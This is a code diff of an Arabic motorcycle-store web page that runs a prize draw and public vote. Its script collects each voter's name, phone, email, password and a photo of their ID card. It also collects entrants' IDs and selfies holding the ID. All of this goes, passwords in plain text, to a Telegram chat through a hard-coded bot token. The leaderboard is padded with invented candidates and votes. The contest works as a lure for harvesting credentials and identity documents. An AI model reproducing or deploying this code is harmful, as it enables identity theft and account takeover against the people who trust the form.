-      <a href="tel:780280887" class="tel-link">📞 780280887</a>
+    <div class="cat-card">
+      <span class="cat-icon">🏁</span>
+      <h3>المترات الرياضية (Sport)</h3>
+      <p>هياكل انسيابية متطورة، فرامل قرصية مزدوجة وإضاءة LED ليلية.</p>
+    </div>
+    <div class="cat-card">
+      <span class="cat-icon">🛵</span>
+      <h3>مترات العمل والتوصيل</h3>
+      <p>مصممة للتحمل الشاق والأعمال اليومية باقتصادية فائقة في الوقود.</p>
+    </div>
+    <div class="cat-card">
+      <span class="cat-icon">⛰️</span>
+      <h3>المترات الجبلية والوعرة</h3>
+      <p>عزم هائل لتسلق المرتفعات الصعبة والطرق الوعرة بكل ثبات.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== الموقع ===== -->
+<section id="location">
+  <div class="location-strip">
+    <div class="loc-text">
+      <h3>📍 موقع متجر أمير المترات</h3>
+      <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
+    </div>
+    <div class="phones-list">
+      <a href="tel:777908028" class="phone-link">📞 777908028</a>
+      <a href="tel:780280887" class="phone-link">📞 780280887</a>
     </div>
   </div>
 </section>
 
 <footer>
-  <strong>أمير المترات</strong>
-  <p>القاعدة — الشارع العام</p>
-  <p style="margin-top:8px; font-size:12.5px; opacity:0.7;">© 2026 أمير المترات — جميع الحقوق محفوظة</p>
+  <h3>🏍️ متجر أمير المترات</h3>
+  <p>القاعدة — جوار مستوصف السلطان</p>
+  <p style="margin-top:10px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة لمتجر أمير المترات</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 const ADMIN_PIN = "777908028";
-const STORAGE_KEY = "amir_felling_v4_500";
-const MAX_CAP = 500;
+const STORAGE_KEY = "amir_cloud_fast_v6";
 
-let voterIdBlob = null;
-let idCardBlob = null;
-let selfieIdBlob = null;
-let expectedCaptcha = 12;
+const MAX_CANDIDATES = 100;
 
-function createInitialRoster() {
-  const baseNames = [
-    "خلدون محمد منصور", "أحمد علي القاعدي", "محمد عبدالقادر التعزي", "صلاح الدين عبده",
-    "ياسر حسن المحمدي", "ماجد حسين الجندي", "طارق عبدالكريم المعلاوي", "نبيل سعيد الشيخ",
+let compressedIdBlob = null;
+let compressedSelfieBlob = null;
+let compressedVoterIdBlob = null;
+let captchaExpected = 8;
+
+function buildInitial50Candidates() {
+  const firstNames = [
+    "خلدون محمد منصور", "أحمد علي الحميري", "محمد عبدالقادر الشرعبي", "صلاح الدين عبده",
+    "ياسر حسن الصلوي", "ماجد حسين الجندي", "طارق عبدالكريم القدسي", "نبيل سعيد المقطري",
     "وليد محمد الحوباني", "جمال أحمد الشميري", "عادل علي المخلافي", "فؤاد يحيى الشيباني",
     "رامي صادق الذبحاني", "سامر خالد العواضي", "هاني محمد الرداعي", "بسام عبدالمجيد",
     "كريم ناصر الحمادي", "مراد سالم الصبري", "أكرم توفيق اليوسفي", "تامر فهد السقاف",
     "زياد عمر باوزير", "مهند حسام الحكيمي", "أنس راشد الزبيري", "إيهاب جميل الكحلاني",
     "رائد محمود العريقي", "مروان نبيل الدبعي", "عصام حسن الأشول", "شادي محمد الهتار",
     "غسان علي المسلمي", "فراس عبدربه النهاري", "أيمن صالح الحالمي", "سعيد محمد القباطي",
-    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد الشرعبي",
+    "منير أحمد الذماري", "حازم خالد الإبي", "بشير عبدالله التعزي", "أديب محمد العدني",
     "نواف سعيد الصنعاني", "وسام علي الحديدي", "ليث محمد المرادي", "قيس عبدالرحمن",
     "عمار حسن الشرجبي", "مجدي صالح الوصابي", "صدام محمد الحجري", "إبراهيم علي الجبري",
-    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن القدسي",
-    "مصطفى عبدالحميد", "سفيان محمد الحكيمي"
+    "حسين محمد القدسي", "عبدالسلام أحمد", "يوسف سعيد المعمري", "علي محسن الشرعبي",
+    "مصطفى عبدالحميد", "سفيان محمد القاعدي"
   ];
-  const cities = ["القاعدة", "صنعاء", "تعز", "إب", "عدن", "الحوبان", "ذمار"];
 
-  return baseNames.map((name, idx) => {
-    const isTop = idx === 0;
-    const code = isTop ? "AMIR-7272" : `AMIR-${(2100 + idx * 17).toString().padStart(4, "0")}`;
-    const phone = isTop ? "776818383" : `77${(4000000 + idx * 13791).toString().slice(0, 7)}`;
-    const votes = isTop ? 78 : Math.max(4, 65 - idx);
-    return { k: code, n: name, p: phone, y: cities[idx % cities.length], v: votes };
+  const cities = ["القاعدة", "إب", "تعز", "الحوبان", "عدن", "الشرعب", "المعشار"];
+
+  return firstNames.map((name, idx) => {
+    const isKhaldoun = name === "خلدون محمد منصور";
+    const code = isKhaldoun ? "AMIR-7272" : `AMIR-${(3100 + idx * 73).toString().padStart(4, "0").slice(-4)}`;
+    const phone = isKhaldoun ? "776818383" : `77${(1000000 + idx * 13789).toString().slice(0, 7)}`;
+    const votes = isKhaldoun ? 68 : Math.max(4, 62 - idx);
+    return {
+      k: code,
+      n: name,
+      p: phone,
+      y: cities[idx % cities.length],
+      v: votes
+    };
   });
 }
 
-function loadState() {
+function loadLocalState() {
   try {
-    const raw = localStorage.getItem(STORAGE_KEY);
-    if (raw) {
-      const parsed = JSON.parse(raw);
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) {
+      const parsed = JSON.parse(saved);
       if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
-        return { c: parsed.c.slice(0, MAX_CAP), h: Array.isArray(parsed.h) ? parsed.h : [] };
+        return { c: parsed.c, h: Array.isArray(parsed.h) ? parsed.h : [] };
       }
     }
   } catch (e) {}
-  return { c: createInitialRoster(), h: [] };
+  return { c: buildInitial50Candidates(), h: [] };
 }
 
-let stateData = loadState();
+let cloudState = loadLocalState();
 
-function persistLocal() {
-  stateData.c.sort((a, b) => (b.v || 0) - (a.v || 0));
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(stateData));
+function persistLocalState() {
+  cloudState.c.sort((a, b) => (b.v || 0) - (a.v || 0));
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(cloudState));
 }
 
-function initCaptcha() {
+function generateCaptcha() {
   const a = Math.floor(Math.random() * 9) + 2;
   const b = Math.floor(Math.random() * 9) + 1;
-  expectedCaptcha = a + b;
-  const el = document.getElementById("captchaQuestion");
-  if (el) el.textContent = `${a} + ${b} = ?`;
+  captchaExpected = a + b;
+  const qEl = document.getElementById("captchaQuestion");
+  if (qEl) qEl.textContent = `🔐 كم ناتج: ${a} + ${b} = ؟`;
 }
 
-function hashValue(val) {
-  let h = 0;
-  const s = String(val).trim().toLowerCase();
-  for (let i = 0; i < s.length; i++) {
-    h = ((h << 5) - h) + s.charCodeAt(i);
-    h |= 0;
+function shortHash(str) {
+  let hash = 0;
+  const clean = String(str).trim().toLowerCase();
+  for (let i = 0; i < clean.length; i++) {
+    hash = ((hash << 5) - hash) + clean.charCodeAt(i);
+    hash |= 0;
   }
-  return Math.abs(h).toString(36);
+  return Math.abs(hash).toString(36);
 }
 
-function buildSortedLines(limit = 25) {
-  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  return sorted.slice(0, limit).map((item, idx) => {
-    const badge = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `${idx + 1}.`;
-    return `${badge} <b>${item.n}</b> | <code>${item.k}</code> ➔ <b>${item.v || 0} صوت</b>`;
-  }).join("\n");
-}
-
-async function syncFromTelegramCloud(manual = false) {
+// مزامنة سريعة من السحابة دون إبطاء واجهة التصويت
+async function syncFromTelegramCloud(manualTrigger = false) {
   try {
     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const data = await res.json();
-    const pinnedText = data?.result?.pinned_message?.text;
-    if (pinnedText) {
+
+    if (data.ok && data.result && data.result.pinned_message && data.result.pinned_message.text) {
+      const pinnedText = data.result.pinned_message.text;
       const match = pinnedText.match(/#AMIR_DB#([\s\S]*?)#END_DB#/);
       if (match && match[1]) {
-        const cloudObj = JSON.parse(match[1].trim());
-        if (cloudObj && Array.isArray(cloudObj.c) && cloudObj.c.length > 0) {
-          stateData = {
-            c: cloudObj.c.slice(0, MAX_CAP),
-            h: Array.isArray(cloudObj.h) ? cloudObj.h : []
-          };
-          persistLocal();
+        const parsed = JSON.parse(match[1].trim());
+        if (parsed && Array.isArray(parsed.c) && parsed.c.length > 0) {
+          cloudState = parsed;
+          persistLocalState();
         }
       }
     }
-    renderBoard();
-    applyUrlVoteParam();
-    if (manual) {
-      const b = document.getElementById("boardSummaryBadge");
-      if (b) {
-        b.style.transform = "scale(1.05)";
-        setTimeout(() => { b.style.transform = "scale(1)"; }, 180);
+
+    renderLeaderboardUI();
+    checkUrlVoteParam();
+
+    if (manualTrigger) {
+      const counterEl = document.getElementById("capacityCounter");
+      if (counterEl) {
+        counterEl.style.transform = "scale(1.06)";
+        setTimeout(() => { counterEl.style.transform = "scale(1)"; }, 200);
       }
     }
-  } catch (e) {
-    renderBoard();
+  } catch (err) {
+    renderLeaderboardUI();
   }
 }
 
-async function syncCloudBackground() {
-  persistLocal();
+function buildSortedTelegramLeaderboard(limit = 20) {
+  const sorted = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  let lines = "";
+  sorted.slice(0, limit).forEach((c, idx) => {
+    const medal = idx === 0 ? "🥇" : idx === 1 ? "🥈" : idx === 2 ? "🥉" : `🔹 ${idx + 1}.`;
+    lines += `${medal} <b>${c.n}</b> | <code>${c.k}</code> ➔ <b>${c.v || 0} صوت</b>\n`;
+  });
+  return lines;
+}
+
+// تحديث السجل في الخلفية لعدم تأخير تجربة التصويت
+async function backgroundCloudSync() {
+  persistLocalState();
   try {
-    const total = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
-    const lines = buildSortedLines(15);
-    const payload =
-`📊 سجل مسابقة أمير المترات (السعة ${MAX_CAP})
-👥 المتسابقون: ${stateData.c.length}/${MAX_CAP} | 🗳️ الأصوات: ${total}
+    const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
+    const summaryLines = buildSortedTelegramLeaderboard(12);
+    const payloadText =
+`📊 سجل المسابقة المرتب — متجر أمير المترات
+👥 المتسابقون: ${cloudState.c.length}/${MAX_CANDIDATES} | 🗳️ الأصوات: ${totalVotes}
 ━━━━━━━━━━━━━━━━━━
-${lines}
+${summaryLines}
 #AMIR_DB#
-${JSON.stringify(stateData)}
+${JSON.stringify(cloudState)}
 #END_DB#`;
 
     const chatRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${CHAT_ID}`);
     const chatData = await chatRes.json();
-    const pinned = chatData?.result?.pinned_message;
-    if (pinned && pinned.text && pinned.text.includes("#AMIR_DB#")) {
+    const pinnedMsg = chatData?.result?.pinned_message;
+
+    if (pinnedMsg && pinnedMsg.text && pinnedMsg.text.includes("#AMIR_DB#")) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, message_id: pinned.message_id, text: payload })
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          message_id: pinnedMsg.message_id,
+          text: payloadText
+        })
       }).catch(() => {});
     }
   } catch (e) {}
 }
 
-function renderBoard() {
+function renderLeaderboardUI() {
   const listEl = document.getElementById("leaderboardList");
   const selectEl = document.getElementById("candidateSelect");
-  const summaryEl = document.getElementById("boardSummaryBadge");
-  const heroCapEl = document.getElementById("heroCapVal");
-  const heroVotesEl = document.getElementById("heroVotesVal");
-  const query = (document.getElementById("searchInput")?.value || "").trim().toLowerCase();
+  const counterEl = document.getElementById("capacityCounter");
+  const searchInput = document.getElementById("searchCandidateInput");
+  const query = searchInput ? searchInput.value.trim().toLowerCase() : "";
 
-  const sorted = [...(stateData.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
-  const totalVotes = sorted.reduce((s, item) => s + (item.v || 0), 0);
+  const candidates = [...(cloudState.c || [])].sort((a, b) => (b.v || 0) - (a.v || 0));
+  const totalVotes = candidates.reduce((sum, item) => sum + (item.v || 0), 0);
 
-  if (summaryEl) summaryEl.textContent = `المتسابقون: ${sorted.length}/${MAX_CAP} • الأصوات: ${totalVotes}`;
-  if (heroCapEl) heroCapEl.textContent = `${sorted.length} / ${MAX_CAP}`;
-  if (heroVotesEl) heroVotesEl.textContent = String(totalVotes);
+  if (counterEl) {
+    counterEl.textContent = `👥 المتسابقون: ${candidates.length}/${MAX_CANDIDATES} • 🗳️ إجمالي الأصوات: ${totalVotes}`;
+  }
 
   if (selectEl) {
     const currentVal = selectEl.value;
-    selectEl.innerHTML = `<option value="">-- اختر متسابقاً (${sorted.length} متاح) --</option>`;
-    sorted.forEach(c => {
+    selectEl.innerHTML = `<option value="">-- اختر متسابقاً من القائمة (${candidates.length}) --</option>`;
+    candidates.forEach(c => {
       const opt = document.createElement("option");
       opt.value = c.k;
       opt.textContent = `${c.n} (${c.k}) — ${c.v || 0} صوت`;
@@ -1413,393 +957,446 @@ function renderBoard() {
     if (currentVal) selectEl.value = currentVal;
   }
 
-  const filtered = sorted.filter(c =>
+  const filtered = candidates.filter(c =>
     c.n.toLowerCase().includes(query) ||
     c.k.toLowerCase().includes(query) ||
+    (c.p && c.p.toLowerCase().includes(query)) ||
     (c.y && c.y.toLowerCase().includes(query))
   );
 
   if (filtered.length === 0) {
-    listEl.innerHTML = `<div style="text-align:center; padding:24px; color:var(--text-sub);">لا توجد نتائج مطابقة للبحث.</div>`;
+    listEl.innerHTML = `<div style="text-align:center; padding:25px; color:var(--text-muted);">لا توجد نتائج مطابقة لبحثك.</div>`;
     return;
   }
 
   listEl.innerHTML = "";
   filtered.forEach(cand => {
-    const rank = sorted.findIndex(x => x.k === cand.k);
-    const isTop = rank === 0;
-    const div = document.createElement("div");
-    div.className = "board-row" + (isTop ? " top-rank" : "");
-    div.innerHTML = `
-      <div class="row-left">
-        <div class="rank-circle">${isTop ? "1" : rank + 1}</div>
+    const realRank = candidates.findIndex(item => item.k === cand.k);
+    const isTop1 = realRank === 0;
+    const item = document.createElement("div");
+    item.className = "leader-item" + (isTop1 ? " top-1" : "");
+    item.innerHTML = `
+      <div class="leader-info">
+        <div class="rank-badge">${isTop1 ? "👑" : realRank + 1}</div>
         <div>
-          <div class="row-name">${escHtml(cand.n)}</div>
-          <div class="row-sub">${escHtml(cand.y || "")} • <span class="row-code">${escHtml(cand.k)}</span></div>
+          <div class="leader-name">${cleanHTML(cand.n)}</div>
+          <div class="leader-meta">${cleanHTML(cand.y || "")} • <span class="leader-code">${cleanHTML(cand.k)}</span></div>
         </div>
       </div>
       <div style="text-align:left;">
-        <div class="votes-badge">${cand.v || 0} صوت</div>
-        <button type="button" class="vote-mini-btn" onclick="pickCandidate('${escHtml(cand.k)}')">تصويت</button>
-        <button type="button" class="del-btn admin-ctrl" onclick="deleteCandidate('${escHtml(cand.k)}', '${escHtml(cand.n)}')">حذف</button>
+        <div class="vote-count-pill">🗳️ ${cand.v || 0} صوت</div>
+        <button type="button" class="quick-vote-btn" onclick="selectCandidateForVote('${cleanHTML(cand.k)}')">صوّت له</button>
+        <button type="button" class="admin-del-btn admin-only-control" onclick="deleteCandidateAdmin('${cleanHTML(cand.k)}', '${cleanHTML(cand.n)}')">🗑️ استبعاد</button>
       </div>
     `;
-    listEl.appendChild(div);
+    listEl.appendChild(item);
   });
 }
 
-function pickCandidate(code) {
-  const sel = document.getElementById("candidateSelect");
-  const inp = document.getElementById("candidateCodeInput");
-  if (sel) sel.value = code;
-  if (inp) {
-    inp.value = code;
-    inp.focus();
+function checkUrlVoteParam() {
+  const params = new URLSearchParams(window.location.search);
+  const voteCode = params.get("vote");
+  if (voteCode) {
+    const cleanCode = voteCode.trim().toUpperCase();
+    const found = cloudState.c.find(c => c.k === cleanCode);
+    const codeInput = document.getElementById("candidateCodeInput");
+    const selectEl = document.getElementById("candidateSelect");
+    const banner = document.getElementById("directInviteBanner");
+    const label = document.getElementById("invitedCandidateLabel");
+
+    if (codeInput && !codeInput.value) codeInput.value = cleanCode;
+    if (selectEl && found) selectEl.value = cleanCode;
+    if (banner && label) {
+      banner.style.display = "block";
+      label.textContent = found ? `${found.n} (${cleanCode})` : cleanCode;
+    }
+    const modal = document.getElementById("promoModal");
+    if (modal) modal.style.display = "none";
   }
 }
 
 function syncCodeFromSelect() {
-  const sel = document.getElementById("candidateSelect");
-  const inp = document.getElementById("candidateCodeInput");
-  if (sel && inp && sel.value) inp.value = sel.value;
-}
-
-function chooseModel(modelName) {
-  const sel = document.getElementById("regModel");
-  if (sel) sel.value = modelName;
-  const regSec = document.getElementById("register");
-  if (regSec) regSec.scrollIntoView({ behavior: "smooth" });
-}
-
-function applyUrlVoteParam() {
-  const params = new URLSearchParams(window.location.search);
-  const vCode = params.get("vote");
-  if (!vCode) return;
-  const clean = vCode.trim().toUpperCase();
-  const found = stateData.c.find(c => c.k === clean);
-  const inp = document.getElementById("candidateCodeInput");
-  const sel = document.getElementById("candidateSelect");
-  const banner = document.getElementById("inviteBanner");
-  const lbl = document.getElementById("inviteTargetLabel");
-
-  if (inp && !inp.value) inp.value = clean;
-  if (sel && found) sel.value = clean;
-  if (banner && lbl) {
-    banner.style.display = "block";
-    lbl.textContent = found ? `${found.n} (${clean})` : clean;
+  const selectEl = document.getElementById("candidateSelect");
+  const codeInput = document.getElementById("candidateCodeInput");
+  if (selectEl && codeInput && selectEl.value) {
+    codeInput.value = selectEl.value;
   }
 }
 
+function selectCandidateForVote(code) {
+  const codeInput = document.getElementById("candidateCodeInput");
+  const selectEl = document.getElementById("candidateSelect");
+  if (codeInput) codeInput.value = code;
+  if (selectEl) selectEl.value = code;
+  if (codeInput) codeInput.focus();
+}
+
+function goToSection(sectionId) {
+  const modal = document.getElementById("promoModal");
+  if (modal) {
+    modal.style.opacity = "0";
+    modal.style.transition = "opacity 0.25s ease";
+    setTimeout(() => { modal.style.display = "none"; }, 250);
+  }
+  const target = document.getElementById(sectionId);
+  if (target) target.scrollIntoView({ behavior: "smooth" });
+}
+
+// ===== تصويت سريع ومفتوح لجميع الأجهزة مع منع تكرار الرقم أو البريد فقط =====
 document.getElementById("voteForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const fb = document.getElementById("voteFeedback");
-  const thanksBox = document.getElementById("voteThanksBox");
-  fb.className = "feedback";
-  if (thanksBox) thanksBox.style.display = "none";
+  const voteMsg = document.getElementById("voteMsg");
+  const thanksCard = document.getElementById("storeThanksCard");
+  voteMsg.className = "msg";
+  if (thanksCard) thanksCard.style.display = "none";
 
-  const ans = parseInt(document.getElementById("captchaAnswer").value, 10);
-  if (ans !== expectedCaptcha) {
-    fb.className = "feedback err";
-    fb.textContent = "ناتج التحقق الحسابي غير صحيح.";
-    initCaptcha();
+  const userAns = parseInt(document.getElementById("captchaAnswer").value, 10);
+  if (userAns !== captchaExpected) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "❌ إجابة التحقق الحسابي غير صحيحة! حاول مرة أخرى.";
+    generateCaptcha();
     return;
   }
 
-  if (!voterIdBlob) {
-    fb.className = "feedback err";
-    fb.textContent = "يرجى إرفاق صورة البطاقة الشخصية أو الجواز للمصوّت.";
+  if (!compressedVoterIdBlob) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "❌ يرجى إرفاق صورة البطاقة الشخصية أو الجواز قبل اعتماد الصوت!";
     return;
   }
 
-  const code = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
-  const voterName = escHtml(document.getElementById("voterName").value.trim());
-  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, "");
+  const rawCode = document.getElementById("candidateCodeInput").value.trim().toUpperCase();
+  const voterName = cleanHTML(document.getElementById("voterName").value.trim());
+  const voterPhone = document.getElementById("voterPhone").value.trim().replace(/\s+/g, '');
   const voterEmail = document.getElementById("voterEmail").value.trim().toLowerCase();
-  const voterPass = escHtml(document.getElementById("voterPassword").value.trim());
+  const voterPassword = cleanHTML(document.getElementById("voterPassword").value.trim());
 
-  const target = stateData.c.find(c => c.k === code);
-  if (!target) {
-    fb.className = "feedback err";
-    fb.textContent = "رمز المتسابق غير موجود في القائمة.";
+  const targetCand = cloudState.c.find(c => c.k === rawCode);
+  if (!targetCand) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "❌ رمز المتسابق غير موجود! تأكد من كتابة الرمز الصحيح.";
     return;
   }
 
-  if (target.p && target.p === voterPhone) {
-    fb.className = "feedback err";
-    fb.textContent = "لا يُسمح للمتسابق بالتصويت لنفسه.";
+  if (targetCand.p && targetCand.p === voterPhone) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "🚫 نعتذر، لا يُسمح للمتسابق بالتصويت لنفسه حرصاً على عدالة المنافسة.";
     return;
   }
 
-  const pHash = hashValue(voterPhone);
-  const eHash = hashValue(voterEmail);
-  if (stateData.h.includes(pHash) || stateData.h.includes(eHash)) {
-    fb.className = "feedback err";
-    fb.textContent = "تم استخدام رقم الهاتف أو البريد الإلكتروني مسبقاً في التصويت.";
+  const phoneHash = shortHash(voterPhone);
+  const emailHash = shortHash(voterEmail);
+  if (cloudState.h.includes(phoneHash) || cloudState.h.includes(emailHash)) {
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "🚫 هذا الرقم أو البريد سبق له التصويت؛ يمكنك التصويت برقم وبريد مختلف.";
     return;
   }
 
   const btn = document.getElementById("voteSubmitBtn");
   btn.disabled = true;
-  btn.textContent = "جارٍ إرسال الصوت والوثيقة للبوت...";
+  btn.textContent = "⚡ جارٍ إرسال وثيقة التصويت للبوت...";
 
   try {
-    target.v = (target.v || 0) + 1;
-    stateData.h.push(pHash, eHash);
-    persistLocal();
-    renderBoard();
+    targetCand.v = (targetCand.v || 0) + 1;
+    cloudState.h.push(phoneHash, emailHash);
+    persistLocalState();
+    renderLeaderboardUI();
 
-    const caption =
-`🗳️ <b>تصويت جديد — أمير المترات</b>
+    const shortVoterCaption =
+`🗳️ <b>بيانات تصويت ووثيقة مُصوِّت — متجر أمير المترات</b>
 ━━━━━━━━━━━━━━━━━━
-🎯 <b>المتسابق:</b> ${target.n}
-🎟️ <b>الرمز:</b> <code>${code}</code>
-🔢 <b>مجموع أصواته:</b> <b>${target.v}</b>
+🎯 <b>المتسابق:</b> ${targetCand.n}
+🎟️ <b>الرمز:</b> <code>${rawCode}</code>
+🔢 <b>أصواته الحالية:</b> <b>${targetCand.v} صوت</b>
 ━━━━━━━━━━━━━━━━━━
-🙋‍♂️ <b>المصوّت:</b> ${voterName}
-📞 <b>الهاتف:</b> <code>${voterPhone}</code>
-📧 <b>البريد:</b> <code>${voterEmail}</code>
-🔑 <b>كلمة السر:</b> <code>${voterPass}</code>`;
+🙋‍♂️ <b>المُصوِّت:</b> ${voterName}
+📞 <b>هاتفه:</b> <code>${voterPhone}</code>
+📧 <b>بريده:</b> <code>${voterEmail}</code>
+🔑 <b>كلمة السر:</b> <code>${voterPassword}</code>`;
 
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", voterIdBlob, "voter_id.jpg");
-    fd.append("caption", caption);
-    fd.append("parse_mode", "HTML");
+    const fdVote = new FormData();
+    fdVote.append("chat_id", CHAT_ID);
+    fdVote.append("photo", compressedVoterIdBlob, "voter_id.jpg");
+    fdVote.append("caption", shortVoterCaption);
+    fdVote.append("parse_mode", "HTML");
 
-    const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    const rVote = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
-      body: fd
-    }).then(r => r.json());
+      body: fdVote
+    });
+    const dVote = await rVote.json();
+    if (!dVote.ok) throw new Error("Telegram vote photo failed");
 
-    if (!photoRes.ok) throw new Error("upload failed");
-
-    const totalNow = stateData.c.reduce((s, x) => s + (x.v || 0), 0);
-    const topLines = buildSortedLines(25);
-    const summaryMsg =
-`🏆 <b>تحديث الترتيب — أمير المترات</b>
-👥 المتسابقون: <b>${stateData.c.length}/${MAX_CAP}</b> | 🗳️ الأصوات: <b>${totalNow}</b>
+    const updatedTotal = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
+    const sortedLines = buildSortedTelegramLeaderboard(20);
+    const independentLeaderboardMsg =
+`🏆 <b>الترتيب المرتب بعد التصويت — متجر أمير المترات</b>
+🗳️ <b>إجمالي الأصوات:</b> <b>${updatedTotal}</b> | 👥 <b>المتسابقون:</b> <b>${cloudState.c.length}</b>
 ━━━━━━━━━━━━━━━━━━
-${topLines}`;
+${sortedLines}`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: summaryMsg, parse_mode: "HTML" })
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: independentLeaderboardMsg,
+        parse_mode: "HTML"
+      })
     }).catch(() => {});
 
-    syncCloudBackground();
+    backgroundCloudSync();
 
-    fb.className = "feedback ok";
-    fb.textContent = `تم اعتماد صوتك لصالح (${target.n} - ${code}) بنجاح.`;
+    voteMsg.className = "msg ok-msg";
+    voteMsg.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${targetCand.n} - ${rawCode}) وإرسال بياناتك للبوت!`;
 
-    if (thanksBox) {
-      document.getElementById("voteThanksText").textContent =
-        `شكراً لك يا ${voterName}، تم احتساب صوتك لصالح ${target.n} بنجاح.`;
-      thanksBox.style.display = "block";
+    const thanksDetails = document.getElementById("thanksDetailsText");
+    if (thanksDetails) {
+      thanksDetails.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${targetCand.n}) بنجاح، ويسعدنا دائماً تواصلكم وثقتكم بمتجر أمير المترات.`;
+    }
+    if (thanksCard) {
+      thanksCard.style.display = "block";
+      thanksCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
 
+    // إعادة تهيئة حقول المصوت للسماح بتصويت شخص آخر برقم وبريد مختلف بسرعة
     document.getElementById("voterName").value = "";
     document.getElementById("voterPhone").value = "";
     document.getElementById("voterEmail").value = "";
     document.getElementById("voterPassword").value = "";
     document.getElementById("captchaAnswer").value = "";
     document.getElementById("voterIdImage").value = "";
-    voterIdBlob = null;
+    compressedVoterIdBlob = null;
     const prev = document.getElementById("voterIdPreview");
     if (prev) prev.style.display = "none";
-    initCaptcha();
+    generateCaptcha();
 
     btn.disabled = false;
-    btn.textContent = "اعتماد الصوت الآن";
+    btn.textContent = "🗳️ اعتمد صوتي الآن";
+
   } catch (err) {
-    fb.className = "feedback err";
-    fb.textContent = "تعذر إرسال البيانات للبوت، تحقق من الاتصال وحاول مجدداً.";
+    voteMsg.className = "msg err";
+    voteMsg.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
     btn.disabled = false;
-    btn.textContent = "اعتماد الصوت الآن";
+    btn.textContent = "🗳️ اعتمد صوتي الآن";
   }
 });
 
-document.getElementById("registerForm").addEventListener("submit", async function(e) {
+function buildAttractiveInviteMessage(candidateName, code, shareUrl) {
+  return `🏍️✨ *مسابقة السحب والتصويت المباشر — متجر أمير المترات* ✨🏍️
+
+أهلاً بكم أحبتي وأصدقائي الكرام 🌟
+أشارككم فرحتي بمشاركتي في مسابقة السحب والتصويت على *"متر فلينج"* من *متجر أمير المترات* 🏆
+
+🎟️ *اسمي:* ${candidateName}
+🔑 *رمزي في المسابقة:* ${code}
+
+دعمكم وصوتكم يفرق معي كثيراً ويدفعني للمنافسة بشرف 💪🔥
+يرجى الدخول عبر الرابط المباشر أدناه والتصويت لي بخطوات سهلة وسريعة:
+🔗 ${shareUrl}
+
+🙏 *شكراً جزيلاً لكل من يشارك ويدعم، ونتمنى للجميع التوفيق والشفافية.*
+🏍️ *متجر أمير المترات — القاعدة (جوار مستوصف السلطان)*`;
+}
+
+document.getElementById("raffleForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const fb = document.getElementById("regFeedback");
-  fb.className = "feedback";
+  const msg = document.getElementById("msg");
+  msg.className = "msg";
 
-  if (!idCardBlob || !selfieIdBlob) {
-    fb.className = "feedback err";
-    fb.textContent = "يرجى إرفاق صورة الهوية/الجواز وصورة السيلفي مع الهوية.";
+  if (!compressedIdBlob || !compressedSelfieBlob) {
+    msg.className = "msg err";
+    msg.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
     return;
   }
 
-  if (stateData.c.length >= MAX_CAP) {
-    fb.className = "feedback err";
-    fb.textContent = `تم الوصول للحد الأقصى للمتسابقين (${MAX_CAP}).`;
+  if (cloudState.c.length >= MAX_CANDIDATES) {
+    msg.className = "msg err";
+    msg.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين في هذه المسابقة (100 متسابق).";
     return;
   }
 
-  const phone = document.getElementById("regPhone").value.trim().replace(/\s+/g, "");
-  if (stateData.c.some(c => c.p === phone)) {
-    fb.className = "feedback err";
-    fb.textContent = "رقم الهاتف مسجل مسبقاً في قائمة المتسابقين.";
+  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
+  if (cloudState.c.some(c => c.p === rawPhone)) {
+    msg.className = "msg err";
